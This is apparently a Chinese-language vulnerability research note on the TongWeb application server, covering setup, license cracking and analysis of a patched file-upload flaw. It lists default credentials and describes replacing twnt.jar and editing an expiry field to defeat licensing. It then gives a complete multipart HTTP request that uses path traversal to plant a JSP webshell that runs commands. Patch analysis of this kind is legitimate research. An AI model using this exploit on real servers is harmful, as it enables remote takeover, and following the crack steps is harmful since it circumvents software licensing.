# TongWeb

## 环境搭建
Tongweb安装，双击`Install_TW6.1.5.13_Enterprise_JDK_Windows.exe`。一直点击下一步即可。安装完成后，从bin目录下的`startserver.bat`文件启动tongweb。如果控制台出现`TongWeb server startup complete`即启动成功

访问`http://ip:9060/console`，如果成功看到TongWeb管理控制台界面即成功。tongweb6.1登陆`用户名:thanos 密码:thanos123.com`

**license破解**

twnt.jar是license相关包，破解的twnt.jar放到lib目录下替换，并在tongweb根目录下创建一个空的license.dat。有的破解twnt.jar可能已经失效，例如启动tongweb时报错license过期。针对license过期的问题，修改`com.tongtech.a.b.a.a.a`类中`end_date`字段值，例如修改为2025-10-10

**修改jar包的技巧**

假如想要替换jar包中某个类的内容。新建一个IDEA工程，选取TongWeb对应的JDK版本，例如1.7，在src目录下，根据想要替换的类的package路径创建一个类，然后复制源类中的内容并进行修改，然后点击IDEA的build，生成out文件夹下对应的.class文件，复制出来。用7zip打开jar包，用生成的.class替换掉原文件即可。

## 补丁分析
补丁地址： http://www.tongtech.com/Services/Services-103_2.html

根据补丁的发布顺序，官方修复的信息大致如下
```
(1) 关闭命令行运维用户的上传文件功能
(2) 修复控制台命令执行、文件上传 、XSS和未授权访问问题
(3) 修复管理控制台文件上传和下载问题
(4) 修复未授权JNDI注入、控制台命令执行问题
(5) 修复命令执行、未授权访问、文件上传/下载/删除等问题
```

**(1) 关闭命令行运维用户的上传文件功能**
补丁修复位于`\applications\sysweb\WEB-INF\web.xml`，直接将补丁替换原文件即可，对比补丁和原文件，发现删除了如下几行
```
	<servlet>
		<servlet-name>upload</servlet-name>
		<servlet-class>com.tongweb.admin.jmx.remote.server.servlet.AppUploadServlet</servlet-class>
	</servlet>
	<servlet-mapping>
		<servlet-name>upload</servlet-name>
		<url-pattern>/upload</url-pattern>
	</servlet-mapping>
```

这个访问路径为`http://ip:9060/sysweb/upload`，默认的用户名`cli`，密码`cli123.com`

<details>
  <summary>AppUploadServlet代码</summary>
  <pre>
  <code>
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        PrintWriter out = resp.getWriter();
        InputStream is = null;
        FileOutputStream fos = null;
        String tempPath = System.getProperty("tongweb.home") + File.separator + "temp";
        String filePath = tempPath + File.separator + "upload";
        try {
            Iterator i$ = req.getParts().iterator();
            while(i$.hasNext()) {
                Part p = (Part)i$.next();
                is = p.getInputStream();
                String header = p.getHeader("content-disposition");
                String fileName = this.parseFileName(header); // return header.substring(header.lastIndexOf("=") + 1, header.length());
                File file = new File(filePath, fileName);
                if (!file.exists()) {
                    File temp = new File(filePath);
                    if (!temp.exists()) {
                        temp.mkdir();
                    }
                    file.createNewFile();
                }
                fos = new FileOutputStream(file);
                byte[] buffer = new byte[1856219];
                while(true) {
                    int bytedata = is.read(buffer);
                    if (bytedata == -1) {
                        break;
                    }
                    fos.write(buffer, 0, bytedata);
                }
            }
            out.write("success!");
        } catch (IOException var18) {
            out.write("fail to upload\n");
            var18.printStackTrace();
        } finally {
            if (is != null) {
                is.close();
            }
            if (out != null) {
                out.flush();
                out.close();
            }
            if (fos != null) {
                fos.flush();
                fos.close();
            }
        }
    }
  </code>
  </pre>
</details>

下面发包过程存在一个坑，主要是AppUploadServlet代码中在获取fileName时用了parseFileName方法，该方法截取最后一个等号后的内容，然后和Tongweb的安装目录`C:\TongWeb6.1\temp\upload`进行拼接。

如果直接上传文件，一般filename="c.jsp"，这样拼接完的路径是`C:\TongWeb6.1\temp\upload\"c.jsp"`，而Windows又禁止文件名包含`\ / : * ? " < > |`其中的一个。所以在抓包时，将filename后面的引号去掉，并且可以跨目录
```
POST /sysweb/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaYguOre6zCdYZhE1

------WebKitFormBoundaryaYguOre6zCdYZhE1
Content-Disposition: form-data; name="filename"; filename=../../applications/console/c.jsp
Content-Type: application/octet-stream

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
------WebKitFormBoundaryaYguOre6zCdYZhE1--
```

这个漏洞在远程调试时存在断点无法命中的问题。解决这个问题就需要打jar包。根据class的package全限定名`package com.tongweb.admin.jmx.remote.server.servlet`。将目录切到com的所在目录`TongWeb6.1/applications/sysweb/WEB-INF/classes/`下，利用如下命令进行打包
```
jar cvf testsysweb.jar *
```
然后将该jar包添加到lib中，这样将断点打到该jar包中的AppUploadServlet类中，即可命中。
